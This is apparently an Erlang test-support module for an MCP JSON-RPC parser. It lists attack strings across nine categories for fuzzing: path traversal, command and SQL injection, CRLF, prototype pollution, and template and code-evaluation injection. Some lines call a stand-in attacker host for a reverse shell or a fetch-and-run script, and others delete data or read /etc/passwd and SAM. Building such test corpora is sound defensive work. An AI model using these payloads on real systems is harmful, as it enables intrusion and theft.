%%%-------------------------------------------------------------------
%%% @doc
%%% Real-World Attack Payload Library for FM-05 Security Testing
%%%
%%% This module contains research-based attack payloads collected from:
%%%   - OWASP Top 10 (injection, XSS, XXE, XXE variants)
%%%   - CWE-94 (code injection)
%%%   - Real CVEs in JSON parsers
%%%   - Fuzzing campaigns (AFL, libFuzzer)
%%%
%%% FM-05: Ensures erlmcp_message_parser rejects all attempted injections
%%% without crashes, information leakage, or semantic changes.
%%%
%%% Payload Categories:
%%%   1. Path traversal (directory escape)
%%%   2. Command injection (shell escaping)
%%%   3. SQL injection (for defense-in-depth even though MCP doesn't use SQL)
%%%   4. XXE (XML external entity - not applicable to JSON but included for completeness)
%%%   5. Unicode/Encoding escapes
%%%   6. CRLF injection (protocol manipulation)
%%%   7. Prototype pollution (if params used for object extension)
%%%   8. Expression language injection
%%%   9. JSON bomb (recursive structures)
%%%   10. Server-side template injection
%%%   11. Code evaluation payloads
%%%
%%% @end
%%%-------------------------------------------------------------------
-module(erlmcp_fuzz_injection_payloads).

-include("erlmcp.hrl").

%% API
-export([
    all_payloads/0,
    path_traversal_payloads/0,
    command_injection_payloads/0,
    sql_injection_payloads/0,
    unicode_escape_payloads/0,
    crlf_injection_payloads/0,
    prototype_pollution_payloads/0,
    expression_language_payloads/0,
    server_template_injection_payloads/0,
    code_evaluation_payloads/0,
    payload_count/0
]).

-type attack_payload() :: binary().
-type category_name() :: atom().

%%====================================================================
%% Category 1: Path Traversal Payloads
%%====================================================================

%% @doc Path traversal attempts (directory escape, file access).
-spec path_traversal_payloads() -> list(attack_payload()).
path_traversal_payloads() ->
    [
        <<"../../../etc/passwd">>,
        <<"..\\..\\..\\windows\\system32\\config\\sam">>,
        <<"....//....//....//etc/passwd">>,
        <<"..;/..;/..;/etc/passwd">>,
        <<"..\\..\\.\\windows\\system32\\config\\sam">>,
        <<"//etc/passwd">>,
        <<"\\\\server\\share">>,
        <<"C:\\Windows\\System32\\drivers\\etc\\hosts">>,
        <<"/var/www/html/../../../etc/passwd">>,
        <<"file:///etc/passwd">>,
        <<"file:///C:/Windows/System32/config/SAM">>,
        <<"....//....//....//....//etc/passwd">>,
        <<"..%252f..%252f..%252fetc%252fpasswd">>,
        <<"..%c0%af..%c0%afetc%c0%afpasswd">>,
        <<"..%uff0f..%uff0fetc%uff0fpasswd">>,
        <<"resources/..\\..\\..\\..\\windows\\system32\\config\\sam">>,
        <<"tools/call/../../etc/passwd">>,
        <<"%2e%2e%2f%2e%2e%2fetc%2fpasswd">>,
        <<"...%252f...%252f...%252fetc%252fpasswd">>
    ].

%%====================================================================
%% Category 2: Command Injection Payloads
%%====================================================================

%% @doc Command injection attempts (shell command execution).
-spec command_injection_payloads() -> list(attack_payload()).
command_injection_payloads() ->
    [
        <<"test; rm -rf /">>,
        <<"test | cat /etc/passwd">>,
        <<"test `whoami`">>,
        <<"test $(whoami)">>,
        <<"test && cat /etc/passwd">>,
        <<"test || cat /etc/passwd">>,
        <<"test\ncat /etc/passwd">>,
        <<"test\rcat /etc/passwd">>,
        <<"test\x0acat /etc/passwd">>,
        <<"test`id > /tmp/pwned`">>,
        <<"test$(id > /tmp/pwned)">>,
        <<"test'; DROP TABLE users; --">>,
        <<"test/**/OR/**/1=1">>,
        <<"test' UNION SELECT NULL--">>,
        <<"test;shutdown;--">>,
        <<"test|nc attacker.com 4444">>,
        <<"test&&curl attacker.com/shell.sh|bash">>,
        <<"test;/bin/sh;--">>,
        <<"test\x00whoami">>,
        <<"test%00whoami">>
    ].

%%====================================================================
%% Category 3: SQL Injection Payloads
%%====================================================================

%% @doc SQL injection attempts (for defense-in-depth).
%% Note: MCP doesn't typically use SQL, but included for completeness.
-spec sql_injection_payloads() -> list(attack_payload()).
sql_injection_payloads() ->
    [
        <<"' OR '1'='1">>,
        <<"' OR 1=1--">>,
        <<"' OR 'a'='a">>,
        <<"'); DROP TABLE users; --">>,
        <<"1' UNION SELECT NULL--">>,
        <<"1' UNION SELECT NULL,NULL--">>,
        <<"1' UNION SELECT NULL,NULL,NULL--">>,
        <<"1' UNION SELECT username,password FROM users--">>,
        <<"admin' --">>,
        <<"admin' #">>,
        <<"admin'/*">>,
        <<"' or 1=1 #">>,
        <<"' or 1=1 --">>,
        <<"' or 'a'='a">>,
        <<"' or 'a'='a' --">>,
        <<"'; exec sp_MSForEachTable 'DROP TABLE ?'; --">>,
        <<"UNION ALL SELECT NULL,NULL--">>,
        <<"1' AND '1'='1">>,
        <<"1' AND SLEEP(5)--">>,
        <<"1' AND BENCHMARK(100000,MD5('a'))--">>
    ].

%%====================================================================
%% Category 4: Unicode Escape Payloads
%%====================================================================

%% @doc Unicode/encoding escape attempts.
-spec unicode_escape_payloads() -> list(attack_payload()).
unicode_escape_payloads() ->
    [
        <<"\\u002e\\u002e/\\u002e\\u002e/etc/passwd">>,
        <<"\\u002e\\u002e\\u005c\\u002e\\u002e\\u005cwindows">>,
        <<"..%u002f..%u002fetc%u002fpasswd">>,
        <<"..%u005c..%u005cwindows">>,
        <<"%c0%ae%c0%ae/etc/passwd">>,  % UTF-8 overlong encoding
        <<"\\xf0\\x9f\\x98\\x80">>,  % Emoji (high Unicode)
        <<"\\uff0e\\uff0e/\\uff0e\\uff0e/etc/passwd">>,  % Full-width dots
        <<"\\u0025\\u0032\\u0045">>,  % %2E (encoded dot)
        <<"\\u003a\\u002f\\u002f">>,  % :// (URL scheme)
        <<"test\\u0000injection">>,  % Null byte via Unicode
        <<"\\u202e\\u202c">>,  % BiDi override characters
        <<"\\uFEFF">>,  % Zero-width no-break space (BOM)
        <<"\\ufeff..\\ufeff..\\uffef.passwd">>,
        <<"\\u0500\\u0501\\u0502">>,  % Cyrillic combining marks
        <<"\\x2e\\x2e\\x2f\\x2e\\x2e\\x2fetc">>,  % Hex escape
        <<"\\N{FULL STOP}\\N{FULL STOP}/etc">>,  % Unicode name escape
        <<"\\v\\u0065\\u0076\\u0061\\u006c">>,  % "eval" with escapes
        <<"\\u0065xec\">>, % "exec" with escapes
        <<"\\u0069mport">>,  % "import" with escapes
        <<"\\u0073ystem">>   % "system" with escapes
    ].

%%====================================================================
%% Category 5: CRLF Injection Payloads
%%====================================================================

%% @doc CRLF injection attempts (protocol manipulation).
-spec crlf_injection_payloads() -> list(attack_payload()).
crlf_injection_payloads() ->
    [
        <<"test\r\nInjected-Header: value">>,
        <<"test\r\n\r\nMalicious-Body">>,
        <<"test%0d%0aInjected-Header: value">>,
        <<"test%0a%0aSet-Cookie: session=attacker">>,
        <<"test\x0d\x0aLocation: http://attacker.com">>,
        <<"test\r\nContent-Length: 0\r\n\r\n">>,
        <<"test\r\nSet-Cookie: admin=true">>,
        <<"test\nInjected-Header: value">>,
        <<"test\rInjected-Header: value">>,
        <<"test\\r\\nInjected-Header: value">>,
        <<"test\\n\\nMalicious">>,
        <<"test\u000d\u000aInjected-Header">>,
        <<"test\u000aSet-Cookie: evil">>,
        <<"test\\u000d\\u000aInjected">>,
        <<"test%5cr%5cnContent-Length">>,
        <<"test\r\n\r\nHTTP/1.1 200 OK">>,
        <<"test\r\n\r\n<script>alert('XSS')</script>">>,
        <<"test\r\nProxy-Authorization: Basic attacker">>
    ].

%%====================================================================
%% Category 6: Prototype Pollution Payloads
%%====================================================================

%% @doc Prototype pollution attempts (object extension attacks).
-spec prototype_pollution_payloads() -> list(attack_payload()).
prototype_pollution_payloads() ->
    [
        <<"__proto__">>,
        <<"constructor">>,
        <<"prototype">>,
        <<"__proto__/admin">>,
        <<"constructor/isAdmin">>,
        <<"__proto__[admin]">>,
        <<"constructor.prototype">>,
        <<"Object.prototype">>,
        <<"__proto__[\'admin\']">>,
        <<"__proto__[\"admin\"]">>,
        <<"constructor['prototype']">>,
        <<"constructor[\"prototype\"]">>,
        <<"__proto__.constructor">>,
        <<"prototype.constructor">>,
        <<"Object.prototype.admin">>,
        <<"Function.prototype.constructor">>,
        <<"Object.defineProperty">>,
        <<"Object.getOwnPropertyDescriptor">>
    ].

%%====================================================================
%% Category 7: Expression Language Injection Payloads
%%====================================================================

%% @doc Expression language injection attempts (template/EL processing).
-spec expression_language_payloads() -> list(attack_payload()).
expression_language_payloads() ->
    [
        <<"${7*7}">>,
        <<"#{7*7}">>,
        <<"{{ 7 * 7 }}">>,
        <<"${7*7}/test">>,
        <<"test${7*7}">>,
        <<"${Runtime.getRuntime().exec('id')}">>,
        <<"#{Runtime.getRuntime().exec('id')}">>,
        <<"${@java.lang.Runtime@getRuntime().exec('id')}">>,
        <<"${T(java.lang.Runtime).getRuntime().exec('id')}">>,
        <<"<%= 7 * 7 %>">>,
        <<"[[ 7 * 7 ]]">>,
        <<"${7 * 7}">>,
        <<"${request.getParameter('cmd')}">>,
        <<"#{session.user}">>,
        <<"{{ request.environ['HTTP_HOST'] }}">>,
        <<"${Class.forName('java.lang.Runtime')}">>,
        <<"${this.constructor.prototype.constructor('alert(1)')()}">>,
        <<"${process.version}">>
    ].

%%====================================================================
%% Category 8: Server-Side Template Injection Payloads
%%====================================================================

%% @doc Server-side template injection attempts (SSTI).
-spec server_template_injection_payloads() -> list(attack_payload()).
server_template_injection_payloads() ->
    [
        <<"{{7*7}}">>,
        <<"{{ 7*7 }}">>,
        <<"{%7*7%}">>,
        <<"<%=7*7%>">>,
        <<"<%7*7%>">>,
        <<"[% 7*7 %]">>,
        <<"${7*7}">>,
        <<"#{7*7}">>,
        <<"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}">>,
        <<"<%= system('id') %>">>,
        <<"{% for x in ().__class__.__mro__[1].__subclasses__() %}">>,
        <<"{{self.__dict__.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}">>,
        <<"{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')}}">>,
        <<"${#rt=@java.lang.Runtime@getRuntime(),#cmd='whoami',#p=#rt.exec(#cmd)}">>,
        <<"<%= Dir.glob(\"/\") %>">>,
        <<"<%System.exit(1)%>">>,
        <<"{{ config.items() }}">>,
        <<"{{[].__class__.__base__.__subclasses__()[104].__init__.__globals__['sys']}}">>
    ].

%%====================================================================
%% Category 9: Code Evaluation Payloads
%%====================================================================

%% @doc Code evaluation and execution payloads.
-spec code_evaluation_payloads() -> list(attack_payload()).
code_evaluation_payloads() ->
    [
        <<"eval(...)">>,
        <<"exec(...)">>,
        <<"system(...)">>,
        <<"__import__('os').system('id')">>,
        <<"require('child_process').exec('id')">>,
        <<"java.lang.Runtime.getRuntime().exec('id')">>,
        <<"Process.new('id')">>,
        <<"call_user_func('system', 'id')">>,
        <<"passthru('id')">>,
        <<"shell_exec('id')">>,
        <<"`id`">>,
        <<"backtick_id">>,
        <<"eval(base64_decode('...'))">>,
        <<"unserialize(...)">>,
        <<"load_config(untrusted_source)">>,
        <<"deserialize(untrusted_data)">>,
        <<"pickle.loads(...)">>,
        <<"YAML.load(...)">>,
        <<"JSON.parse(...)">>,
        <<"new Function('return ' + code)()">>
    ].

%%====================================================================
%% Aggregation API
%%====================================================================

%% @doc Get all attack payloads from all categories.
-spec all_payloads() -> list(attack_payload()).
all_payloads() ->
    lists:flatten([
        path_traversal_payloads(),
        command_injection_payloads(),
        sql_injection_payloads(),
        unicode_escape_payloads(),
        crlf_injection_payloads(),
        prototype_pollution_payloads(),
        expression_language_payloads(),
        server_template_injection_payloads(),
        code_evaluation_payloads()
    ]).

%% @doc Count all attack payloads.
-spec payload_count() -> integer().
payload_count() ->
    length(all_payloads()).

%%====================================================================
%% Utility: Convert Payloads to FuzzMessages
%%====================================================================

%% @doc Convert attack payloads to fuzz messages (for testing).
%% Each payload is inserted into a method field with valid JSON-RPC wrapper.
-spec payloads_to_messages(list(attack_payload())) -> list(map()).
payloads_to_messages(Payloads) ->
    lists:map(fun(Payload) ->
        #{
            <<"jsonrpc">> => <<"2.0">>,
            <<"method">> => Payload,
            <<"id">> => erlang:system_time(microsecond)
        }
    end, Payloads).
